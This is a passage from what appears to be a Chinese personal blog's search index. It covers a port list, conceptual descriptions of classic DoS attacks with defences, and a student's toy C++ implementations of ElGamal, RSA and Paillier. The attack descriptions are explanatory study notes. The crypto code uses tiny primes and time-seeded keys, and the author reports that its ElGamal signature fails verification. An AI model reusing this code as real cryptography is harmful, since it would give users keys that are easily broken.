数据库</p><p>1521端口：Oracle数据库</p><p>2049端口：NFS，通过网络，让不同的机器、不同的操作系统实现文件共享<strong>（UDP）</strong></p><p>3218端口：Squid（是一种用来缓存Internet数据的软件。接受来自人们需要下载的目标（object）的请求并适当的处理这些请求。）</p><p>3306端口：MYSQL数据库端口</p><p>3389端口：WIN2003远程登录，Windows 2000(2003) Server远程桌面的服务端口，本地服务器开放此端口，去连接到远程的服务器</p><p>5432端口：PostgreSQL数据库端口</p><p>6379端口：Redis数据库端口</p><p>8010端口：Wingate代理开放此端口</p><p>8080端口：TCP服务端默认端口，TOMCAT，WWW代理开放此端口</p><p>8888端口：Nginx服务器的端口、（服务器管理软件宝塔默认端口：8888）</p><p>9200端口：Elasticsearch服务器端口</p><p>27017端口：mongoDB数据库默认端口</p><p>22122端口：fastdfs服务器默认端口</p><h4 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a><a href="https://www.runoob.com/http/http-status-codes.html">HTTP 状态码</a></h4>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常见Dos攻击</title>
      <link href="/2022/06/16/%E5%B8%B8%E8%A7%81Dos%E6%94%BB%E5%87%BB/"/>
      <url>/2022/06/16/%E5%B8%B8%E8%A7%81Dos%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="常见Dos攻击"><a href="#常见Dos攻击" class="headerlink" title="常见Dos攻击"></a>常见Dos攻击</h1><h3 id="（1）SYN-Flooding（洪泛）攻击"><a href="#（1）SYN-Flooding（洪泛）攻击" class="headerlink" title="（1）SYN Flooding（洪泛）攻击"></a>（1）SYN Flooding（洪泛）攻击</h3><p>TCP SYN泛洪是利用TCP建立连接时需要进行三次握手的过程，并结合IP源地址欺骗实现的。</p><p>攻击者将其自身的源地址伪装成一个私有地址向本地系统的TCP服务发起连接请求，本地TCP服务回复一个SYN-ACK作为响应，然而该响应发往的地址并非攻击者的地址（真实地址），而是攻击者伪装的私有地址。由于该私有地址是不存在的于本地服务器所在的网络的，所有本地系统将收不到RST消息（以结束这个半打开连接）。本地TCP服务接下来要等待接收一个ACK回应，但是该回应永远不会到来，该半打开连接会保持打开状态直至连接尝试超时，因此有限的连接资源被消耗了。攻击者连接请求的到来比TCP超时释放资源更快，利用一次又一次的连接请求淹没本地连接资源（如通过listen（）创建的大小有限的连接队列等），以致本地服务无法接收更多的连接请求。</p><p>Linux操作系统中的SYN cookie模块能显著的延缓SYN泛洪造成的网络资源缺失现象：在TCP服务接收到TCP SYN包并返回SYN-ACK时，不分配一个专门的数据区，而是根据这个SYN包计算一个cookie值。cookie值是一个基于SYN中的原始序列号、源地址、目的地址、端口号、密值而产生的序列号。cookie作为将要返回的SYN-ACK的初始序列号，当客户返回一个ACK包，TCP服务在根据cookie值检查该ACK包的合法性，再分配专门的数据区进行处理接下来操作。cookie的超时时间很短暂，客户端必须在很短时间内进行应答。</p><p><strong>防范：</strong></p><p>1、缩短SYN Timeout时间<br>2、设置SYN Cookie，就是给每一个请求连接的IP地址分配一个Cookie，如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，以后从这个IP地址来的包会被一概丢弃。<br>　　&gt;netstat -n -p tcp &gt;result.txt</p><p><strong>echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_syncookies</strong> 命令可以打开Linux内核的SYN cookie保护功能；需要注意一些发行版需要配置内核才能打开。</p><h3 id="（2）ICMP洪泛攻击"><a href="#（2）ICMP洪泛攻击" class="headerlink" title="（2）ICMP洪泛攻击"></a>（2）ICMP洪泛攻击</h3><p>ICMP路由重定向炸弹<br>我们知道ICMP的消息类型中的类型5是告知目标系统改变内存中的路由表以获得更短的路由，以通知主机有更多的路径可用。重定向很少发源主机附近的路由器，对于连接到ISP（运营商）的住宅或商用站点来说，主机附近的路由器产生一个重定向的ICMP消息可能性非常小。如果我们主机使用静态路由且收到了重定向消息，这可能是有人在攻击我们系统，欺骗主机以转发所有流量到另一远处主机处。</p><h3 id="（3）UDP洪泛攻击"><a href="#（3）UDP洪泛攻击" class="headerlink" title="（3）UDP洪泛攻击"></a>（3）UDP洪泛攻击</h3><p>不同于TCP，UDP是<strong>无状态</strong>的，没有任何信息被维护以指明下一个期望到来的数据包，所以UDP服务更易受这些类型攻击的影响，许多站点都禁止用所有非必要的UDP端口。</p><h3 id="（4）Ping-of-Death攻击"><a href="#（4）Ping-of-Death攻击" class="headerlink" title="（4）Ping of Death攻击"></a>（4）Ping of Death攻击</h3><p>“ping ofdeath”攻击就是我们常说的”死亡Ping”<br>　　这种攻击通过发送大于65536字节的ICMP包使操作系统崩溃；通常不可能发送大于65536个字节的ICMP包，但可以把报文分割成片段，然后在目标主机上重组；最终会导致被攻击目标缓冲区溢出，引起拒绝服务攻击。有些时候导致telne和http服务停止，有些时候路由器重启。</p><h3 id="（5）IP欺骗DoS攻击"><a href="#（5）IP欺骗DoS攻击" class="headerlink" title="（5）IP欺骗DoS攻击"></a>（5）IP欺骗DoS攻击</h3><p>这种攻击利用TCP协议栈的RST位来实现，使用IP欺骗，迫使服务器把合法用户的连接复位，影响合法用户的连接。假设有一个合法用户（100.100.100.100）已经同服务器建了正常的连接，攻击者构造攻击的TCP数据，伪装自己的IP为100.100.100.100，并向服务器发送一个带有RST位的TCP数据段。服务器接收到这样的数据后，认为从100.100.100.100发送的连接有错误，就会清空缓冲区中已建立好的连接。这时，合法用户100.100.100.100再发送合法数据，服务器就已经没有这样的连接了，该用户就被拒绝服务而只能重新开始建立新的连接。</p><h3 id="（6）IP分片攻击"><a href="#（6）IP分片攻击" class="headerlink" title="（6）IP分片攻击"></a>（6）IP分片攻击</h3><p>我们知道数据包从一个路由器沿路径（源计算机到目的计算机的路径）到下一个路由器时，网关路由器可能需要在它们进行传递到下一个网络前将数据包分切为更小的片段（超过MTU值会被分片），在这些片段里第一个分片会包含UDP或者TCP报头中的源端口号和目的端口号，接下来的分片并不包含。当数据包被分片时中间路由器不会重组数据包，数据包到达目的主机或邻近路由器时才会重新组装。</p><p>分片炸弹的实现是构造一种非常小的数据包导致系统或者程序崩溃的操作：比如构造一个最初的分片使得UDP或者TCP的源端口和目的端口被包含在第二个分片中。许多防火墙并不检查第一个分片之后的分片，然而第一个分片由于防火墙所要过滤的信息还未呈现，所以得以通过，那么最终所有分片都在主机中得以组装。</p><p>另外，因为中间进行分片基本上比发送更小的无需分片的数据包代价更高，所以一般会在发送在IP报头中设置了不分片标志，设置后系统会向目标主机发起连接前进行MTU发现，如果中间路由器必须对数据包进行分片那么它会丢弃数据包并赶回ICMP 3错误消息，即“需要分片”。</p><h3 id="（7）Teardrop（泪滴）攻击"><a href="#（7）Teardrop（泪滴）攻击" class="headerlink" title="（7）Teardrop（泪滴）攻击"></a>（7）Teardrop（泪滴）攻击</h3><p>对于一些大的IP数据包，往往需要对其进行拆分传送，这是为了迎合链路层的MTU（最大传输单元）的要求。比如，一个6 000字节的IP包，在MTU为2 000的链路上传输的时候，就需要分成3个IP 包。在IP报头中有一个偏移字段和一个拆分标志（MF）。如果MF标志设置为1，则表示这个IP包是一个大IP包的片段，其中偏移字段指出了这个片段在整个IP包中的位置。例如，对一个6 000字 节的IP包进行拆分（MTU为2 000），则3个片段中偏移字段的值依次为0，2000，4 000。这样接收端在全部接收完IP数据包后，就可以根据这些信息重新组装这几个分次接收的拆分IP包。在这 里就有一个安全漏洞可以利用了，就是如果黑客们在截取IP数据包后，把偏移字段设置成不正确的值，这样接收端在收到这些分拆的数据包后，就不能按数据包中的偏移字段值正确组合这些拆分的数据包，但接收端会不断尝试，这样就可能致使目标计算机操作系统因资源耗尽而崩溃。</p><h3 id="（8）Land（LandAttack）攻击"><a href="#（8）Land（LandAttack）攻击" class="headerlink" title="（8）Land（LandAttack）攻击"></a>（8）Land（LandAttack）攻击</h3><p>在Land攻击中，黑客利用一个特别打造的SYN包–它的原地址和目标地址都被设置成某一个服务器地址进行攻击。此举将导致接受服务器向它自己的地址发送SYN-ACK消息，结果这个地址又发回ACK消息并创建一个空连接，每一个这样的连接都将保留直到超时，在Land攻击下，许多UNIX将崩溃，NT变得极其缓慢（大约持续五分钟）。</p><h3 id="（9）Smurf攻击"><a href="#（9）Smurf攻击" class="headerlink" title="（9）Smurf攻击"></a>（9）Smurf攻击</h3><p>发送伪装的ICMP数据包，目的地址设为某个网络的广播地址，源地址设为要攻击的目的主机，使所有收到此ICMP数据包的主机都将对目的主机发出一个回应，使被攻击主机在某一段时间内收到 成千上万的数据包<br><strong>防范：</strong>在cisco路由器上配置如下可以防止将包传递到广播地址上:<br>　　Router（config-if）# no ip directed-broadcast</p><h3 id="（10）Fraggle攻击"><a href="#（10）Fraggle攻击" class="headerlink" title="（10）Fraggle攻击"></a>（10）Fraggle攻击</h3><p>类似于Smurf，使用UDP应答消息而非ICMP。UDP端口7（ECHO）和端口19（Chargen）在收到UDP报文后，都会产生回应。在UDP的7号端口收到报文后，会回应收到的内容，而UDP的19号端口在收到报文后，会产生一串字符流。它们都同ICMP一样，会产生大量无用的应答报文，占满网路带宽。攻击者可以向子网广播地址发送源地址为受害网络或受害主机的UDP包，端口号用7或19.子网络启用了此功能的每个系统都会向受害者的主机做出响应，从而引发大量的包，导致受害网络的阻塞或受害主机的崩溃；子网上没有启动这些功能的系统将产生一个ICMP不可达的消息，因而仍然消耗带宽。也可将源端口改为Chargen。目的端口为ECHO，这样会自动不停地产生回应报文，其危害性更大。<br><strong>防范：</strong><br>检查进入防火墙的UDP报文，若目的端口号为7或19，则直接拒绝，并将攻击记录到日志，否则允许通过。</p><h3 id="（11）WinNuke攻击"><a href="#（11）WinNuke攻击" class="headerlink" title="（11）WinNuke攻击"></a>（11）WinNuke攻击</h3><p>winnuke是利用NetBIOS协议中一个OOB（OutofBand）的漏洞，也就是所谓的带外数据漏洞而进行的，它的原理是通过TCP&#x2F;IP协议传递一个Urgent紧急数据包到计算机的137、138或139端口，当win95&#x2F;NT收到这个数据包之后就会瞬间死机或蓝屏，不重新启动计算机就无法继续使用TCP&#x2F;IP协议来访问网络。</p><p>带外数据OOB是指TCP连接中发送的一种特殊数据，它的优先级高于一般的数据，带外数据在报头中设置了URG标志，可以不按照通常的次序进入TCP缓冲区，而是进入另外一个缓冲区，立即可以被进程读取或根据进程设置使用SIGURG信号通知进程有带外数据到来。</p><p>后来的Winnuke系列工具已经从最初对单个IP的攻击发展到可以攻击一个IP区间范围的计算机，可以检测和选择端口，并且可以进行连续攻击，还能验证攻击的效果，所以使用它可以造成某个IP地址区间的计算机全部蓝屏死机。</p><p>此类攻击是由于利用软件开发过程中对某种特定类型的报文或请求没有处理，导致软件遇到这类型报文时运行出现异常，软件崩溃甚至系统崩溃。</p><p><strong>防范：</strong></p><p>升级系统或给系统打补丁，也可以删除NetBIOS协议或关闭137、138、139端口。</p><h3 id="（12）电子邮件轰炸。"><a href="#（12）电子邮件轰炸。" class="headerlink" title="（12）电子邮件轰炸。"></a>（12）电子邮件轰炸。</h3><p>电子邮件炸弹是最古老的匿名攻击之一，通过设置一台机器不断的大量的向同一地址发送电子邮件，攻击者能够耗尽接受者网络的宽带。由于这种攻击方式简单易用，也有很多发匿名邮件的工具，而且只要对方获悉你的电子邮件地址就可以进行攻击</p>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Record（4）</title>
      <link href="/2021/10/17/Record%EF%BC%884%EF%BC%89/"/>
      <url>/2021/10/17/Record%EF%BC%884%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Record（4）"><a href="#Record（4）" class="headerlink" title="Record（4）"></a>Record（4）</h1><h3 id="1、ElGamal-加密"><a href="#1、ElGamal-加密" class="headerlink" title="1、ElGamal 加密"></a>1、<strong>ElGamal 加密</strong></h3><h4 id="1、生成随机大素数"><a href="#1、生成随机大素数" class="headerlink" title="1、生成随机大素数"></a>1、生成随机大素数</h4><p>进度：完成</p><ol><li><p><strong>常用办法：</strong>伪素数生成，Miller Rabin素性检测</p></li><li><p><strong>参考文章：</strong><br><a href="https://blog.csdn.net/forever_dreams/article/details/82314237">Miller-Rabin素数测试算法</a><br><a href="https://blog.csdn.net/qq_34258344/article/details/104934294?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163436887416780262516258%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163436887416780262516258&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-104934294.pc_search_ecpm_flag&utm_term=elgamal%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95&spm=1018.2226.3001.4187">Elgamal 加密算法</a><br><a href="https://www.cnblogs.com/wkfvawl/p/9125224.html">快速幂取模算法</a></p></li><li><p>实现：</p><pre><code class="c++">int Pseudo_prime()//生成伪素数&#123;    bool ifprime = false;    int Pprime;    int arr[50];    for (int i = 0; i &lt; 50; i++)        arr[i] = i + 3;    while (!ifprime)    &#123;        ifprime = true;        unsigned int TIME = (unsigned)time(0);        srand(TIME+=100);        Pprime = (rand() % 100) * 2 + 1;//生成大奇数        for (int i = 0; i &lt; 50; i++)        &#123;            if (Pprime % arr[i] == 0)            &#123;                ifprime = false;                break;            &#125;        &#125;    &#125;    return Pprime;&#125;bool MillerRabin(int x)//素性检测&#123;    int Prime[10] = &#123; 2,3,5,7,11,13,17,19,23,29 &#125;;    int s = 0, t = x - 1;    int b;    while (!(t&amp;1))    &#123;        s++;        t &gt;&gt;= 1;    &#125;    for (int i = 0; i &lt; 10 &amp;&amp; Prime[i] &lt; x; ++i)      //随便选一个素数进行测试     &#123;        int a = Prime[i];        int b = pow_mod(a, t, x);      //先算出a^t        int k;        for (int j = 1; j &lt;= s; ++j)    //然后进行s次平方         &#123;            k = pow_mod(b, 2, x);   //求b的平方             if (k == 1 &amp;&amp; b != 1 &amp;&amp; b != x - 1)     //用二次探测判断                 return false;            b = k;        &#125;        if (b != 1)  return false;   //用费马小定律判断     &#125;    return true;&#125;</code></pre></li></ol><h4 id="2、快速幂、快速幂取模"><a href="#2、快速幂、快速幂取模" class="headerlink" title="2、快速幂、快速幂取模"></a>2、快速幂、快速幂取模</h4><ol><li><p>原理：快速幂算法的核心思想就是每一步都把指数分成两半，而相应的底数做平方运算。这样不仅能把非常大的指数给不断变小，所需要执行的循环次数也变小，而最后表示的结果却一直不会变。</p></li><li><p>时间复杂度：O(log₂N)</p></li><li><p>参考：<br> <a href="https://zhuanlan.zhihu.com/p/95902286">算法学习笔记(4)：快速幂</a><br> <a href="https://www.cnblogs.com/gcter/p/11155902.html">快速积&amp;快速幂的计算方法</a></p></li><li><p>实现：</p><pre><code class="c++">long long qpow(long long a, long long b)&#123;    long long ans = 1;    while (b)    &#123;        if (b &amp; 1)            ans = ans * a;        a = a * a;        b &gt;&gt;= 1;    &#125;    return ans;&#125;int pow_mod(int g, int x, int p)//快速幂取模&#123;    int ans = 1;    //记录结果    int tmp = g % p;    //预处理，使得a处于c的数据范围之下    while (x)    &#123;        if (x &amp; 1)    //奇数            ans = ans * tmp % p;    //消除指数为奇数的影响        x &gt;&gt;= 1;    //二进制的移位操作,不断的遍历b的二进制位        tmp = tmp * tmp % p;    //不断的加倍    &#125;    return ans;&#125;</code></pre></li></ol><h4 id="3、扩展欧几里得算法"><a href="#3、扩展欧几里得算法" class="headerlink" title="3、扩展欧几里得算法"></a>3、扩展欧几里得算法</h4><ol><li><p>用途：求解**ax + by &#x3D; gcd(a,b)**、计算模反元素元素</p></li><li><p>实现：</p><pre><code class="c++">int e_gcd(int a, int b, int&amp; x, int&amp; y)//扩展欧几里得算法&#123;    if (!b)    &#123;        x = 1; y = 0;        return a;    &#125;    int item = e_gcd(b, a % b, y, x);    y -= a / b * x;    return item;&#125;</code></pre></li></ol><h4 id="4、最后实现"><a href="#4、最后实现" class="headerlink" title="4、最后实现"></a>4、最后实现</h4><p>代码实现由自己完成</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;time.h&gt;using namespace std;long long qpow(long long a, long long b)&#123;    long long ans = 1;    while (b)    &#123;        if (b &amp; 1)            ans = ans * a;        a = a * a;        b &gt;&gt;= 1;    &#125;    return ans;&#125;int pow_mod(int g, int x, int p)//快速幂取模&#123;    int ans = 1;    //记录结果    int tmp = g % p;    //预处理，使得a处于c的数据范围之下    while (x)    &#123;        if (x &amp; 1)    //奇数            ans = ans * tmp % p;    //消除指数为奇数的影响        x &gt;&gt;= 1;    //二进制的移位操作,不断的遍历b的二进制位        tmp = tmp * tmp % p;    //不断的加倍    &#125;    return ans;&#125;long long pow_mod_1(long long g, long long x, long long p)//快速幂取模&#123;    long long ans = 1;    //记录结果    long long tmp = g % p;    //预处理，使得a处于c的数据范围之下    while (x)    &#123;        if (x &amp; 1)    //奇数            ans = ans * tmp % p;    //消除指数为奇数的影响        x &gt;&gt;= 1;    //二进制的移位操作,不断的遍历b的二进制位        tmp = tmp * tmp % p;    //不断的加倍    &#125;    return ans;&#125;int e_gcd(int a, int b, int&amp; x, int&amp; y)//扩展欧几里得算法&#123;    if (!b)    &#123;        x = 1; y = 0;        return a;    &#125;    int item = e_gcd(b, a % b, y, x);    y -= a / b * x;    return item;&#125;int Pseudo_prime()//生成伪素数&#123;    bool ifprime = false;    int Pprime;    int arr[50];    for (int i = 0; i &lt; 50; i++)        arr[i] = i + 3;    while (!ifprime)    &#123;        ifprime = true;        unsigned int TIME = (unsigned)time(0);        srand(TIME+=100);        Pprime = (rand() % 100) * 2 + 1;//生成大奇数        for (int i = 0; i &lt; 50; i++)        &#123;            if (Pprime % arr[i] == 0)            &#123;                ifprime = false;                break;            &#125;        &#125;    &#125;    return Pprime;&#125;bool MillerRabin(int x)//素性检测&#123;    int Prime[10] = &#123; 2,3,5,7,11,13,17,19,23,29 &#125;;    int s = 0, t = x - 1;    int b;    while (!(t&amp;1))    &#123;        s++;        t &gt;&gt;= 1;    &#125;    for (int i = 0; i &lt; 10 &amp;&amp; Prime[i] &lt; x; ++i)      //随便选一个素数进行测试     &#123;        int a = Prime[i];        int b = pow_mod(a, t, x);      //先算出a^t        int k;        for (int j = 1; j &lt;= s; ++j)    //然后进行s次平方         &#123;            k = pow_mod(b, 2, x);   //求b的平方             if (k == 1 &amp;&amp; b != 1 &amp;&amp; b != x - 1)     //用二次探测判断                 return false;            b = k;        &#125;        if (b != 1)  return false;   //用费马小定律判断     &#125;    return true;&#125;void Crea_Key(int&amp; p, int&amp; g, int&amp; x, int&amp; y)&#123;    while (true)    &#123;        p = Pseudo_prime();        if (MillerRabin(p))            break;    &#125;    srand((unsigned)time(0));    x = (rand() % p - 3) + 1;    y = pow_mod(g, x, p);&#125;void Encrypt(int&amp; m, int&amp; c1, int&amp; c2, int&amp; p, int&amp; g, int&amp; y)&#123;    srand((unsigned)time(0));    int k = (rand() % p - 3) + 1;    c1 = pow_mod(g, k, p);    c2 = m * pow_mod(y, k, p) % p;&#125;int Decrypt(int&amp; c1, int&amp; c2, int&amp; p, int&amp; x)&#123;    int item1, item2;    e_gcd(c1, p, item1, item2);    if (item1 &lt; 0)        item1 = (item1 % p) + p;    return c2 * pow_mod(item1, x, p) % p;&#125;int main()&#123;    int x, y;//x为私钥，y为公钥    int r, s;    int m, c1, c2, p, g;    srand((unsigned)time(0));    g = (rand() % 20) + 1;//公共参数g    Crea_Key(p, g, x, y);    cout &lt;&lt; &quot;p=&quot; &lt;&lt; p &lt;&lt; &quot;  g=&quot; &lt;&lt; g &lt;&lt; &quot;  x=&quot; &lt;&lt; x &lt;&lt; &quot;  y=&quot; &lt;&lt; y &lt;&lt; endl;    cout &lt;&lt; &quot;请输入明文：&quot;;    cin &gt;&gt; m ;    Encrypt(m, c1, c2, p, g, y);    cout &lt;&lt; &quot;密文（c1，c2）为：（&quot; &lt;&lt; c1 &lt;&lt; &quot;，&quot; &lt;&lt; c2 &lt;&lt; &quot;）&quot;&lt;&lt; endl;    m = Decrypt(c1, c2, p, x);    cout &lt;&lt; &quot;解密结果为：&quot; &lt;&lt; m &lt;&lt; endl;    return 0;&#125;</code></pre><h4 id="5、主要技术难点"><a href="#5、主要技术难点" class="headerlink" title="5、主要技术难点"></a>5、<strong>主要技术难点</strong></h4><p>快速幂取模，伪素数生成，Miller-Rabin素性检测，扩展欧几里得算法</p><h3 id="2、ElGamal-签名"><a href="#2、ElGamal-签名" class="headerlink" title="2、ElGamal 签名"></a>2、<strong>ElGamal 签名</strong></h3><p>进度：原理实现，签名后无法验签</p><p>参考：<br><a href="https://my.oschina.net/u/1382972/blog/330630">ElGamal加密、签名算法笔记</a><br><a href="https://www.freesion.com/article/8914432159/">ELGAMAL公钥密码算法及ELGAMAL数字签名方案实现</a></p><p>实现：</p><p>代码实现由自己完成</p><pre><code class="c++">void Sign(int&amp; m, int&amp; g, int&amp; p, int&amp; x, int&amp; r, int&amp; s)&#123;    srand((unsigned)time(0));    int k = rand() % 20 + 1;    int item1, item2;    r = pow_mod(g, k, p);    e_gcd(k, p - 1, item1, item2);    if (item1 &lt; 0)        item1 = (item1 % (p - 1)) + (p - 1);    s = (m - x * r) * item1 % (p - 1);&#125;void Verify(int&amp; p, int&amp; g, int&amp; y, int&amp; r, int&amp; s, int&amp; m)&#123;    long long item2;    int item1 = pow_mod(g, m, p);    int item3 = pow_mod(y, r, p);    if (s &lt; 0)    &#123;        int a, b;        s = -s;        item2 = qpow(r, s);        e_gcd(item2, p, a, b);        if (a &lt; 0)            a = (a % p) + p;        item2 = a;    &#125;    else        item2 = pow_mod(r, s, p);    int item4 = item2 * item3 % p;    cout &lt;&lt; item1 &lt;&lt; &quot;  &quot; &lt;&lt; item2 &lt;&lt; &quot;  &quot; &lt;&lt; item3 &lt;&lt; &quot;  &quot; &lt;&lt; item4 &lt;&lt; endl;&#125;</code></pre><h3 id="3、RSA加密"><a href="#3、RSA加密" class="headerlink" title="3、RSA加密"></a>3、<strong>RSA加密</strong></h3><p>进度：已完成</p><ol><li><p><strong>常用办法：</strong>伪素数生成，Miller Rabin素性检测，扩展欧几里德算法</p></li><li><p><strong>参考文章：</strong><br><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html">RSA算法原理（一）</a></p><p><a href="https://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html">RSA算法原理（二）</a></p><p><a href="https://blog.csdn.net/zhjchengfeng5/article/details/7786595">扩展欧几里德算法详解</a></p><p><a href="https://zhuanlan.zhihu.com/p/42707457">数论之拓展欧几里得</a></p></li><li><p><strong>实现：</strong><br>代码实现由自己完成</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;time.h&gt;using namespace std;unsigned int TIME = (unsigned)time(0);int pow_mod(int g, int x, int p)//快速幂取模&#123;    long long ans = 1;    //记录结果    long long tmp = g % p;    //预处理，使得a处于c的数据范围之下    while (x)    &#123;        if (x &amp; 1)    //奇数            ans = ans * tmp % p;    //消除指数为奇数的影响        x &gt;&gt;= 1;    //二进制的移位操作,不断的遍历b的二进制位        tmp = tmp * tmp % p;    //不断的加倍    &#125;    return ans;&#125;int e_gcd(int a, int b, int&amp; x, int&amp; y) &#123;    if (!b)     &#123;        x = 1; y = 0;        return a;    &#125;    int gcd = e_gcd(b, a % b, y, x);    y -= a / b * x;    return gcd;&#125;int Pseudo_prime()//生成伪素数&#123;    bool ifprime = false;    int Pprime;    int arr[50];    for (int i = 0; i &lt; 50; i++)        arr[i] = i + 3;        while (!ifprime)    &#123;        ifprime = true;        srand(TIME += 1000);        Pprime = (rand() % 10000) * 2 + 1;//生成大奇数        for (int i = 0; i &lt; 50; i++)        &#123;            if (Pprime % arr[i] == 0)            &#123;                ifprime = false;                break;            &#125;        &#125;    &#125;    return Pprime;&#125;bool MillerRabin(int x)//素性检测&#123;    int Prime[10] = &#123; 2,3,5,7,11,13,17,19,23,29 &#125;;    int s = 0, t = x - 1;    while (!(t &amp; 1))    &#123;        s++;        t &gt;&gt;= 1;    &#125;    for (int i = 0; i &lt; 10 &amp;&amp; Prime[i] &lt; x; ++i)      //随便选一个素数进行测试     &#123;        int a = Prime[i];        int b = pow_mod(a, t, x);      //先算出a^t        int k;        for (int j = 1; j &lt;= s; ++j)    //然后进行s次平方         &#123;            k = pow_mod(b, 2, x);   //求b的平方             if (k == 1 &amp;&amp; b != 1 &amp;&amp; b != x - 1)     //用二次探测判断                 return false;            b = k;        &#125;        if (b != 1)  return false;   //用费马小定律判断     &#125;    return 1;&#125;void Crea_Key(int&amp; p, int&amp; q, int&amp; e, int&amp; d)//密钥生成，公钥（e，n），私钥d&#123;    int y, item;    for (int i = 0; i &lt; 2;)    &#123;        item = Pseudo_prime();        if (MillerRabin(item) &amp;&amp; i == 0)        &#123;            p = item;            i++;        &#125;        else if (MillerRabin(item) &amp;&amp; i == 1)        &#123;            q = item;            i++;        &#125;    &#125;    int n = p * q;    int Phi = (p - 1) * (q - 1);    srand(TIME);    while (true)    &#123;        e = rand() % Phi;        if (e_gcd(e, Phi, d, y) == 1 &amp;&amp; d &gt; 0)            break;    &#125;    //cout &lt;&lt; &quot;p=&quot; &lt;&lt; p &lt;&lt; &quot;  q=&quot; &lt;&lt; q &lt;&lt; &quot;  n=&quot; &lt;&lt; n &lt;&lt; endl;    //cout &lt;&lt; &quot;e=&quot; &lt;&lt; e &lt;&lt; &quot;  d=&quot; &lt;&lt; d &lt;&lt; &quot;  Phi=&quot; &lt;&lt; Phi &lt;&lt; &quot;  y=&quot; &lt;&lt; y &lt;&lt; endl;&#125;int Encrypt(int&amp; m, int&amp; e, int n)&#123;    return pow_mod(m, e, n);&#125;int Decrypt(int&amp; c, int d, int n)&#123;    return pow_mod(c, d, n);&#125;int main()&#123;    int p, q, e, d, n;    int m, c, x, y, item1, item2;    Crea_Key(p, q, e, d);    n = p * q;    cout &lt;&lt; &quot;请输入0~&quot; &lt;&lt; n &lt;&lt; &quot;的明文：&quot;;    cin &gt;&gt; m;        c = Encrypt(m, e, n);    cout &lt;&lt; &quot;加密后的密文为c=&quot; &lt;&lt; c &lt;&lt; endl;    item1 = Decrypt(c, d, n);    cout &lt;&lt; &quot;解密后的明文为m=&quot; &lt;&lt; item1 &lt;&lt; endl;    return 0;&#125;</code></pre></li></ol><h3 id="4、RSA签名"><a href="#4、RSA签名" class="headerlink" title="4、RSA签名"></a>4、RSA签名</h3><p>参考：<br><a href="https://blog.csdn.net/nie19940803/article/details/88194340">RSA签名和验签</a><br><a href="https://www.cnblogs.com/pcheng/p/9629621.html">RSA加密、解密、签名、验签的原理及方法</a></p><p><strong>实现：</strong></p><p>代码实现由自己完成</p><pre><code class="c++">int Sign(int&amp; x, int&amp; d, int n)&#123;    return pow_mod(x, d, n);&#125;int Verify(int&amp; y, int&amp; e, int n)&#123;    return pow_mod(y, e, n);&#125;</code></pre><h3 id="5、Paillier加密"><a href="#5、Paillier加密" class="headerlink" title="5、Paillier加密"></a>5、Paillier加密</h3><p>进度：已完成</p><p>参考：<br><a href="https://www.cnblogs.com/ranzhong/p/13654485.html">Paillier同态加密的介绍以及c++实现</a></p><p>原理：<br><img src="https://gitee.com/eatingcrime/origin-picture/raw/master/img/20211122124417.jpg"></p><p>实现：<br>代码实现由自己完成</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;time.h&gt;using namespace std;unsigned int TIME = unsigned(time(nullptr));int pow_mod(int g, int x, int p)//快速幂取模&#123;    int ans = 1;    //记录结果    int tmp = g % p;    //预处理，使得a处于c的数据范围之下    while (x)    &#123;        if (x &amp; 1)    //奇数            ans = ans * tmp % p;    //消除指数为奇数的影响        x &gt;&gt;= 1;    //二进制的移位操作,不断的遍历b的二进制位        tmp = tmp * tmp % p;    //不断的加倍    &#125;    return ans;&#125;long long pow_mod_1(long long g, long long x, long long p)//快速幂取模&#123;    long long ans = 1;    //记录结果    long long tmp = g % p;    //预处理，使得a处于c的数据范围之下    while (x)    &#123;        if (x &amp; 1)    //奇数            ans = ans * tmp % p;    //消除指数为奇数的影响        x &gt;&gt;= 1;    //二进制的移位操作,不断的遍历b的二进制位        tmp = tmp * tmp % p;    //不断的加倍    &#125;    return ans;&#125;int L(long long x,long long n)&#123;    return (x - 1) / n;&#125;int gcd(int a, int b)&#123;    if (a % b == 0)        return b;    return gcd(b, a % b);&#125;int e_gcd(int a, int b, int&amp; x, int&amp; y)&#123;    if (!b)    &#123;        x = 1; y = 0;        return a;    &#125;    int item = e_gcd(b, a % b, y, x);    y -= a / b * x;    return item;&#125;int Pseudo_prime()//生成伪素数&#123;    bool ifprime = false;    int Pprime;    int arr[50];    for (int i = 0; i &lt; 50; i++)        arr[i] = i + 3;    while (!ifprime)    &#123;        ifprime = true;        srand(TIME += 100);        Pprime = rand() % 100 * 2 + 1;//生成大奇数        for (int i = 0; i &lt; 50; i++)        &#123;            if (Pprime % arr[i] == 0)            &#123;                ifprime = false;                break;            &#125;        &#125;    &#125;    return Pprime;&#125;bool MillerRabin(int x)//素性检测&#123;    int Prime[10] = &#123; 2,3,5,7,11,13,17,19,23,29 &#125;;    int s = 0, t = x - 1;    while (!(t &amp; 1))    &#123;        s++;        t &gt;&gt;= 1;    &#125;    for (int i = 0; i &lt; 10 &amp;&amp; Prime[i] &lt; x; ++i)      //随便选一个素数进行测试     &#123;        int a = Prime[i];        int b = pow_mod(a, t, x);      //先算出a^t        int k;        for (int j = 1; j &lt;= s; ++j)    //然后进行s次平方         &#123;            k = pow_mod(b, 2, x);   //求b的平方             if (k == 1 &amp;&amp; b != 1 &amp;&amp; b != x - 1)     //用二次探测判断                 return false;            b = k;        &#125;        if (b != 1)  return false;   //用费马小定律判断     &#125;    return true;&#125;void 